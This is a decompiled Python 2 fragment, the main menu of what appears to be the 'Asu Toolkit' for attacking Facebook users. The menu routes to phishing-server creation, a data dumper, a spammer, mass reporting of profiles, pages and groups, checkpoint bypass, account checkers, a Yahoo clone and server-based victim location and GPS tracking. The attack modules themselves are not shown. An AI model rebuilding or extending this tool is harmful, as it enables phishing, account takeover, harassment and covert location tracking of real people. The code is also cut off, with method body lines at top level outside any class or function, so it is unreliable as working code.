[H[2J[3J# uncompyle6 version 3.4.0
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Aug  6 2019, 01:11:15) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <string>
try:
    self.asw = raw_input('%s[%s+%s]%s @deray_> ' % (G, R, G, N)).lower()
except:
    exit('%s[-]%s User Interrupt.' % (R, N))
else:
    if self.asw == '':
        return self.choice()

if self.asw == '1' or self.asw == '01':
    from data import create_server
    create_server.phising()
elif self.asw == '2' or self.asw == '02':
    from data import dumpper
    dumpper.pilihan()
    self.backk()
elif self.asw == '3' or self.asw == '03':
    from data import spammer
    spammer.main()
    self.backk()
elif self.asw == '4' or self.asw == '04':
    print '\n\t[ Select Actions ]\n'
    print '  {%s01%s} Reports Status Target' % (G, N)
    print '  {%s02%s} Mass Reports Profile' % (G, N)
    print '  {%s03%s} Page Reports' % (G, N)
    print '  {%s04%s} Group Reports' % (G, N)
    print '  {%s05%s} Back To Menu Option' % (R, N)
    i = raw_input('\n%s[%s+%s] %sActions>> ' % (G, R, G, N))
    if i == '1' or i == '01':
        from data import reportContent
        reportContent.reportContent()
        self.backk()
    elif i == '2' or i == '02':
        from data import reports
        reports.report()
        self.backk()
    elif i == '3' or i == '03':
        from data import page_report
        page_report.reportpage()
        self.backk()
    elif i == '4' or i == '04':
        from data import group_report
        group_report.index()
        self.backk()
    elif i == '5' or i == '05':
        self.backk()
    else:
        print '%s[!]%s invalid options!' % (R, N)
        self.backk()
elif self.asw == '5' or self.asw == '05':
    from data import auto_addgrup
    auto_addgrup.grup()
    self.backk()
elif self.asw == '6' or self.asw == '06':
    from data import risetPass
    risetPass.risetPass()
    self.backk()
elif self.asw == '7' or self.asw == '07':
    from data import create_server
    create_server.locator()
elif self.asw == '8' or self.asw == '08':
    from data import create_server
    create_server.gps()
elif self.asw == '9' or self.asw == '09':
    from data import checkpoint_detector
    checkpoint_detector.bypass()
    self.backk()
elif self.asw == '10':
    print '\t[ Select Actions ]\n'
    print '  {%s01%s} Akun Ceker (save to file)' % (G, N)
    print '  {%s02%s} Akun Ceker (Just Cek)' % (G, N)
    print '  {%s03%s} Group Cheker' % (G, N)
    print '  {%s04%s} Back\n' % (R, N)
    pk = raw_input('\n%s[%s*%s]%s Actions>> ' % (G, R, G, N))
    if pk == '1' or pk == '01':
        from data import checker
        checker.check()
        self.backk()
    elif pk == '2' or pk == '02':
        from data import checker
        checker.che()
        self.backk()
    elif pk == '3' or pk == '03':
        from data import checker
        checker.index()
        self.backk()
    else:
        exit('%s[!]%s Invalid Options.' % (R, N))
elif self.asw == '11':
    from data import bot
    bot.bot()
    self.backk()
elif self.asw == '12':
    from data import yahoo_clone
    yahoo_clone.clon()
    self.backk()
elif self.asw == '13':
    from data import app_check
    app_check.apps()
    self.backk()
elif self.asw == '14':
    from data import listen
    listen.listen()
elif self.asw == '15':
    print '[%s#%s] Updating Asu Toolkit ...' % (G, N)
    os.system('git pull')
    print '%s[%s**%s]%s Asu was updated. \xc2\xaf\\_(\xe3\x83\x84)_/\xc2\xaf' % (G, R, G, N)
elif self.asw == '16':
    exit('%s[%s*%s%s]%s Bye \xc2\xaf\\_(\xe3\x83\x84)_/\xc2\xaf' % (C, R, N, C, N))
elif self.asw == 'move':
    os.remove('config/config.json')
    os.removedirs('config')
    login()
elif self.asw == 'banner':
    ASU()
elif self.asw == '0' or self.asw == '00':
    from data import inf
    inf.buddy()
elif self.asw == '17':
    from data import reg
    reg.reg()
elif self.asw == '99':
    subprocess.check_output(['am', 'start', 'https://youtu.be/bi1X8o_BGsk'])
elif self.asw == '88':
    subprocess.check_output(['am', 'start', 'https://api.whatsapp.com/send?phone=62895353484895'])
else:
    print '%s[!]%s Invalid Options!' % (R, N)
    self.choice()